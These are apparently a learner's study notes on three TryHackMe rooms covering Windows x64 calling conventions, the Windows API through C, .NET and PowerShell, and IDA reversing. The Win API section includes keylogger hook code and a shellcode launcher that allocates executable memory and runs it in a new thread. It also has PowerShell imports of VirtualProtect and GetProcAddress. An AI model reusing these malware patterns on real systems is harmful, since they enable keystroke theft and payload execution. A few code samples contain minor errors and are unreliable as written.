# Winassembly

**https://tryhackme.com/r/room/win64assembly**

A fairly rudimentary room. The first few modules are just simple learning of number systems, registers, and the like.

We're then introducted to more advanced concepts such as assembly instructions, compare flags, and calling conventions.

The last one I found most insightful, I finally understood what the `__fastcall` paramter meant in function definitions arising from Windows decompilation— its the Windows calling convention. A few more details of it are given below

- The first four non-floating-point parameters are passed left-to-right in registers `rcx`, `rdx`, `r8` and `r9` respectively.
- The first four floating-point parameters are passed in registers `xmm0` to `xmm3`.
- Any more than four parameters and they are pushed to the stack from right to left.
- A function's return value is passed to `rax` if it's a non-floating-point or `xmm0` if it's a float or double.

We also learn a bit about a different calling convention, `cdecl`.

The final module teaches us about the stack and the functioning of stack-frames on function calls.

# Win API

**https://tryhackme.com/r/room/windowsapi**

In this room we learn about the intricacies and working of the Windows API.

We start with a basic introduction to kernel modes and the components of the API.

After that, we dive deeper into the API and understand how ASLR is overcome through the Windows header file and P/Invoke.

Then we learn about the API calling structure and its function call naming scheme, which is as follows:

- **A:** Represents an 8-bit character set with ANSI encoding
- **W:** Represents a Unicode encoding
- **Ex:** Provides extended functionality or in/out parameters to the API call

After that we learn about the C/C++ implementation of the API and expand on the `<Windows.h>` header file's functionality through an example program for creating a pop-up window.

```c
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);
```

implementation:

```c
#include <Windows.h>

HWND hwnd = CreateWindowsEx(
    0,
    CLASS_NAME,
    L"Hello THM!",
    WS_OVERLAPPEDWINDOW,
    CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
    NULL,
    NULL,
    hInstance,
    NULL
);
```

After, we learn about the API's implementation in .NET and PowerShell. Since there's no `Windows.h`, we use `DLLImport` instead with the exact API call we're looking for.

The PowerShell implementation is nearly identical except it uses methods instead of classes. We also need to create a type for each DLL pointer we import, which is then compiled using the C# compiler.

We use an example program here that prints the details of the user's PC.

**.NET:**

```java
class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
    bool success;
    StringBuilder name = new StringBuilder(260);
    uint size = 260;
    success = GetComputerNameA(name, ref size);
    Console.WriteLine(name.ToString());
}
```

**PowerShell:**

```powershell
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
```

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```

```powershell
[Win32.Kernel32]::<Imported Call>()
```

We now learn about the security features and vulnerabilities behind certain API calls, and how they can be abused. This concludes with a case study on two malwares, a keylogger and a shellcode launcher.

**keylogger:**

```java
public static void Main() {
    _hookID = SetHook(_proc);
    Application.Run();
    UnhookWindowsHookEx(_hookID);
    Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
    using (Process curProcess = Process.GetCurrentProcess()) {
        return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
    }
}
```

**Shellcode:**

```java
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```

# Windows Reversing Intro

**https://tryhackme.com/r/room/windowsreversingintro**

This was another basic room that taught the usage of the  IDA decompiler and some basic Windows Reverse Engineering knowledge.

We're first told about function prologues and epilogues, and how a stack frame is created on top of older function stack frames. Then, we move to IDA, where we're taught about function inlining, i.e. the process of removing a function call and putting the contents of it in the calling function directly.

Then, we learn about structures and classes in assembly, and how their contents are stored.

Finally, we learn about DLLs, how they operate, and how they are used in recovering function names in decompilers. We also learn about function name mangling, how you run a DLL for test purposes, and how to analyze files which cannot not be traditionally \`executed\` like DLLs.

